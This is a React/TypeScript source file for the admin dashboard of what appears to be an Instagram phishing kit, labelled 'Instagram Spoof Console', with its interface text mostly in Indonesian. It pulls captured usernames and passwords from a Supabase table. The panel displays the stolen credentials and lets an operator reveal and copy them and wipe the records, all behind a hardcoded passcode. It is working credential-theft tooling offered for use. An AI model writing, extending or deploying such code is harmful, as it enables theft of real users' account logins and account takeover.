import React, { useState, useEffect } from 'react';
import { fetchCapturedCredentials, clearAllCapturedData, deleteRowFromSupabase, CapturedData } from '../services/supabaseService';
import { 
  Shield, KeyRound, Search, Trash2, RefreshCcw, Copy, Check, Eye, EyeOff, 
  Terminal, ShieldCheck, Database, FileSpreadsheet, Lock 
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

export default function AdminPanel() {
  const [data, setData] = useState<CapturedData[]>([]);
  const [tableName, setTableName] = useState('logins');
  const [loading, setLoading] = useState(true);
  const [copiedId, setCopiedId] = useState<string | number | null>(null);
  const [showPasswords, setShowPasswords] = useState<Record<string | number, boolean>>({});
  const [searchTerm, setSearchTerm] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passcode, setPasscode] = useState('');
  const [passcodeError, setPasscodeError] = useState(false);
  const [systemLogs, setSystemLogs] = useState<string[]>([]);

  // Passcode defined here
  const ADMIN_PASSCODE = 'terjebak12131415';

  const addLog = (message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setSystemLogs(prev => [`[${timestamp}] ${message}`, ...prev.slice(0, 15)]);
  };

  const loadData = async () => {
    setLoading(true);
    addLog('Connecting to Supabase rest interface...');
    try {
      const result = await fetchCapturedCredentials();
      setData(result.data);
      setTableName(result.tableName);
      addLog(`Metadata loaded. Found ${result.data.length} records in table [${result.tableName}].`);
    } catch (err) {
      addLog('Error reading Supabase records. Try checking the API console or Table names.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      loadData();
    }
  }, [isAuthenticated]);

  const handleAuthSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (passcode.toLowerCase() === ADMIN_PASSCODE) {
      setIsAuthenticated(true);
      setPasscodeError(false);
    } else {
      setPasscodeError(true);
      setPasscode('');
      setTimeout(() => setPasscodeError(false), 2000);
    }
  };

  const handleCopy = (text: string, id: string | number) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    addLog(`Copied credential info for ID #${id} to clipboard.`);
    setTimeout(() => setCopiedId(null), 1500);
  };

  const togglePasswordVisibility = (id: string | number) => {
    setShowPasswords(prev => ({
      ...prev,
      [id]: !prev[id]
    }));
  };

  const handleClearData = async () => {
    if (!window.confirm(`Apakah Anda yakin ingin menghapus semua (${data.length}) data di tabel "${tableName}"?`)) {
      return;
    }
    
    addLog(`Sending truncate instruction for table: ${tableName}`);
    const success = await clearAllCapturedData(tableName);
    if (success) {
      setData([]);
      addLog(`Table ${tableName} cleared successfully.`);
    } else {
      addLog(`Failed to truncate active table. Check RLS or Delete privileges on Supabase.`);
      alert('Gagal menghapus data. Periksa izin kebijakan RLS (Delete) pada panel Supabase Anda.');
    }
  };

  const handleDeleteRow = async (id: string | number | undefined) => {
    if (!id) return;
    if (!window.confirm(`Apakah Anda yakin ingin menghapus data #${id}?`)) {
      return;
    }

    addLog(`Sending delete request for row ID ${id} in table: ${tableName}`);
    const success = await deleteRowFromSupabase(tableName, id);
    if (success) {
      setData(prev => prev.filter(item => item.id !== id));
      addLog(`Row #${id} deleted successfully.`);
    } else {
      addLog(`Failed to delete row #${id}. Check RLS DELETE policy on Supabase.`);
      alert('Gagal menghapus data. Pastikan izin DELETE diaktifkan pada kebijakan RLS Supabase.');
    }
  };

  // Filter captured list
  const filteredData = data.filter((item) => {
    const userVal = String(item.username || item.user || item.email || '').toLowerCase();
    const passVal = String(item.password || item.pass || '').toLowerCase();
    const query = searchTerm.toLowerCase();
    return userVal.includes(query) || passVal.includes(query);
  });

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans flex flex-col selection:bg-indigo-500/30">
      
      {/* ACCESS LOCKED VIEW BARRIER */}
      <AnimatePresence mode="wait">
        {!isAuthenticated ? (
          <motion.div 
            key="login"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex-1 flex flex-col items-center justify-center p-6 h-screen relative overflow-hidden bg-radial from-slate-900 to-slate-950"
          >
            {/* Ambient Background Grid pattern */}
            <div className="absolute inset-0 bg-[linear-gradient(to_right,#1e293b12_1px,transparent_1px),linear-gradient(to_bottom,#1e293b12_1px,transparent_1px)] bg-[size:24px_24px] pointer-events-none" />

            <div className="w-full max-w-md bg-slate-900/40 border border-slate-800/80 backdrop-blur-xl rounded-2xl p-8 shadow-2xl relative z-10 text-center space-y-6">
              
              <div className="mx-auto w-16 h-16 bg-gradient-to-tr from-indigo-500 to-rose-500 rounded-2xl flex items-center justify-center shadow-lg shadow-indigo-500/20">
                <Lock className="h-8 w-8 text-white" strokeWidth={1.5} />
              </div>

              <div>
                <h1 className="text-2xl font-black tracking-tight text-white flex items-center justify-center gap-2">
                  <Shield className="h-6 w-6 text-indigo-400" />
                  <span>Admin Panel Access</span>
                </h1>
                <p className="text-xs text-slate-400 mt-2">
                  Masukkan passcode otorisasi untuk mendekripsi dan meninjau laporan login yang tertangkap.
                </p>
              </div>

              <form onSubmit={handleAuthSubmit} className="space-y-4">
                <input
                  type="password"
                  placeholder="Passcode Otorisasi"
                  value={passcode}
                  onChange={(e) => setPasscode(e.target.value)}
                  className={`w-full py-3 px-4 bg-slate-950/80 border rounded-xl text-center text-sm text-white tracking-widest font-mono focus:outline-none focus:border-indigo-500 transition-colors ${
                    passcodeError ? 'border-red-500/80 shadow-lg shadow-red-500/10' : 'border-slate-800'
                  }`}
                  autoFocus
                />
                
                {passcodeError && (
                  <p className="text-xs text-red-400 font-medium">
                    Passcode tidak valid. Otorisasi Ditolak!
                  </p>
                )}

                <button
                  type="submit"
                  className="w-full py-3 bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-500 hover:to-indigo-400 text-white text-sm font-semibold rounded-xl cursor-pointer active:scale-[0.98] transition-transform"
                >
                  Buka Kunci Panel
                </button>
              </form>

              <div className="border-t border-slate-800/60 pt-4 flex justify-between items-center text-[10px] text-slate-500">
                <span>Supabase Logs Interface v1.0</span>
                <a href="/" className="text-indigo-400 hover:underline">Kembali Login</a>
              </div>
            </div>
          </motion.div>
        ) : (
          /* MAIN AUTHORIZED ADMIN CONTROL PANEL PANEL */
          <motion.div 
            key="dashboard"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex-1 flex flex-col h-screen"
          >
            {/* Header branding row */}
            <header className="h-16 border-b border-slate-900 bg-slate-950 flex items-center justify-between px-6 shrink-0">
              <div className="flex items-center gap-3">
                <div className="h-9 w-9 bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 rounded-lg flex items-center justify-center">
                  <Terminal className="h-5 w-5" />
                </div>
                <div>
                  <h1 className="text-sm font-bold text-white flex items-center gap-2">
                    Instagram Spoof Console
                    <span className="text-[10px] bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 px-1.5 py-0.5 rounded font-mono font-medium">Supabase API</span>
                  </h1>
                  <p className="text-[10px] text-slate-400">Menghubungkan langsung ke target database rest endpoint</p>
                </div>
              </div>

              <div className="flex items-center gap-3">
                <button
                  onClick={loadData}
                  className="p-2 border border-slate-800 hover:border-slate-700 bg-slate-900/40 hover:bg-slate-900/80 rounded-lg text-slate-300 hover:text-white transition-all cursor-pointer flex items-center gap-1.5 text-xs font-semibold"
                  title="Reload Logs List"
                >
                  <RefreshCcw className={`h-3.5 w-3.5 ${loading ? 'animate-spin text-indigo-400' : ''}`} />
                  <span>Refresh</span>
                </button>
                <a 
                  href="/" 
                  className="px-3.5 py-2 border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 rounded-lg transition-all cursor-pointer text-xs font-semibold flex items-center gap-1.5"
                >
                  Keluar Admin
                </a>
              </div>
            </header>

            {/* Layout Grid columns - Main controls on left, Logs / Terminal on right */}
            <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
              
              {/* Content Panel Area */}
              <main className="flex-1 overflow-y-auto p-6 space-y-6">
                
                {/* Visual Stats Row */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <div className="bg-slate-900/30 border border-slate-900 rounded-2xl p-5 space-y-1">
                    <span className="text-xs text-slate-400 block font-medium">TOTAL LOG DIKUMPULKAN</span>
                    <div className="flex items-baseline gap-2">
                      <span className="text-3xl font-black text-white">{data.length}</span>
                      <span className="text-xs text-indigo-400 font-mono">records</span>
                    </div>
                  </div>
                  <div className="bg-slate-900/30 border border-slate-900 rounded-2xl p-5 space-y-1">
                    <span className="text-xs text-slate-400 block font-medium">NAMA TABEL SUPABASE</span>
                    <div className="flex items-center gap-2">
                      <Database className="h-5 w-5 text-indigo-400" />
                      <span className="text-base font-bold text-white font-mono">{tableName}</span>
                    </div>
                  </div>
                  <div className="bg-slate-900/30 border border-slate-900 rounded-2xl p-5 space-y-1">
                    <span className="text-xs text-slate-400 block font-medium">STATUS API ENDPOINT</span>
                    <div className="flex items-center gap-2">
                      <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
                      <span className="text-sm font-bold text-emerald-400 font-mono">ONLINE (REST v1)</span>
                    </div>
                  </div>
                </div>

                {/* Main Filter Toolbar */}
                <div className="flex flex-col sm:flex-row gap-3 items-center justify-between bg-slate-900/20 border border-slate-900/80 p-3.5 rounded-xl">
                  {/* Search input */}
                  <div className="relative w-full sm:-max-w-md">
                    <Search className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <input
                      type="text"
                      placeholder="Saring berdasarkan nama pengguna atau kata sandi..."
                      value={searchTerm}
                      onChange={(e) => setSearchTerm(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-lg py-2 pl-9 pr-4 text-xs text-white focus:outline-none focus:border-indigo-500"
                    />
                  </div>

                  {/* Actions buttons */}
                  {data.length > 0 && (
                    <button
                      onClick={handleClearData}
                      className="w-full sm:w-auto px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg text-xs font-bold flex items-center justify-center gap-1.5 transition-colors cursor-pointer active:scale-95 shrink-0"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                      <span>Hapus Semua Log Terpapar</span>
                    </button>
                  )}
                </div>

                {/* Table containing sensitive reports */}
                <div className="border border-slate-900 rounded-2xl overflow-hidden bg-slate-900/20">
                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="bg-slate-900/40 text-[11px] font-bold text-slate-400 uppercase tracking-wider border-b border-slate-900">
                          <th className="py-4.5 px-6">ID</th>
                          <th className="py-4.5 px-6">USERNAME / PHONE / EMAIL</th>
                          <th className="py-4.5 px-6">SENSITIVE PASSWORD</th>
                          <th className="py-4.5 px-6">TANGGAL MAJU MASUK</th>
                          <th className="py-4.5 px-6 text-right">TINDAKAN</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-900 text-xs text-slate-300 font-mono">
                        {filteredData.map((row, index) => {
                          // Dynamically identify credentials because columns vary in schemas
                          const id = row.id || index + 1;
                          const userText = row.username || row.user || row.email || row.email_or_username || row.login || 'Unknown';
                          const passText = row.password || row.pass || row.sandi || row.pass_word || '';
                          const dateText = row.created_at ? new Date(row.created_at).toLocaleString('id-ID') : 'Now';

                          return (
                            <tr key={index} className="hover:bg-slate-900/30 transition-colors">
                              <td className="py-4.5 px-6 font-semibold text-slate-500">
                                #{id}
                              </td>
                              <td className="py-4.5 px-6 font-semibold text-white select-text">
                                {userText}
                              </td>
                              <td className="py-4.5 px-6 text-indigo-300 select-text">
                                <div className="flex items-center gap-2">
                                  <span>{showPasswords[id] ? passText : '••••••••'}</span>
                                  <button
                                    onClick={() => togglePasswordVisibility(id)}
                                    className="p-1 hover:bg-slate-800 text-slate-400 hover:text-white rounded transition-colors cursor-pointer"
                                    title="Toggle show/hide"
                                  >
                                    {showPasswords[id] ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                                  </button>
                                </div>
                              </td>
                              <td className="py-4.5 px-6 text-slate-400">
                                {dateText}
                              </td>
                              <td className="py-4.5 px-6 text-right space-x-1.5 shrink-0 select-none">
                                <button
                                  onClick={() => handleCopy(userText, id + '_u')}
                                  className="p-1.5 bg-slate-950 border border-slate-800 rounded-md hover:bg-slate-900 hover:text-white transition-colors cursor-pointer inline-flex items-center justify-center"
                                  title="Copy username"
                                >
                                  {copiedId === id + '_u' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                </button>
                                <button
                                  onClick={() => handleCopy(passText, id + '_p')}
                                  className="p-1.5 bg-slate-950 border border-slate-800 rounded-md hover:bg-slate-900 hover:text-white transition-colors cursor-pointer inline-flex items-center justify-center"
                                  title="Copy password"
                                >
                                  {copiedId === id + '_p' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <KeyRound className="h-3.5 w-3.5" />}
                                </button>
                                <button
                                  onClick={() => handleDeleteRow(row.id || row.id_hash || id)}
                                  className="p-1.5 bg-slate-950 border border-rose-950 rounded-md hover:bg-rose-950 text-rose-400 hover:text-rose-200 transition-colors cursor-pointer inline-flex items-center justify-center animate-fade-in"
                                  title="Hapus baris ini"
                                >
                                  <Trash2 className="h-3.5 w-3.5" />
                                </button>
                              </td>
                            </tr>
                          );
                        })}

                        {filteredData.length === 0 && (
                          <tr>
                            <td colSpan={5} className="py-12 text-center text-slate-500 font-sans">
                              {loading ? (
                                <div className="flex flex-col items-center gap-3">
                                  <div className="h-6 w-6 border-2 border-indigo-500/30 border-t-indigo-500 rounded-full animate-spin" />
                                  <span>Memuat data dari Supabase...</span>
                                </div>
                              ) : (
                                <div className="space-y-1">
                                  <Database className="h-8 w-8 text-slate-700 mx-auto mb-2" />
                                  <p className="font-semibold">Tidak Ada Laporan Ditemukan</p>
                                  <p className="text-xs text-slate-600">Cobalah memasukkan nama pengguna di form masuk untuk memicu perekaman.</p>
                                </div>
                              )}
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              </main>

              {/* Side System Logs Terminal Console */}
              <aside className="w-full md:w-80 border-t md:border-t-0 md:border-l border-slate-900 bg-slate-950 p-4 flex flex-col h-72 md:h-full shrink-0 select-none">
                <div className="flex items-center justify-between pb-3 border-b border-slate-900 shrink-0">
                  <div className="flex items-center gap-1.5 text-slate-400 text-xs font-semibold">
                    <Terminal className="h-4 w-4 text-emerald-500" />
                    <span>Live Console Logs</span>
                  </div>
                  <span className="h-1.5 w-1.5 rounded-full bg-emerald-500 animate-ping" />
                </div>
                
                <div className="flex-1 overflow-y-auto font-mono text-[10px] text-slate-400 py-3 space-y-1.5">
                  {systemLogs.map((log, idx) => (
                    <div key={idx} className="break-all whitespace-pre-wrap leading-relaxed select-text">
                      {log}
                    </div>
                  ))}
                  {systemLogs.length === 0 && (
                    <div className="text-slate-600 italic">No console logs tracked yet. Ready.</div>
                  )}
                </div>
              </aside>

            </div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
}
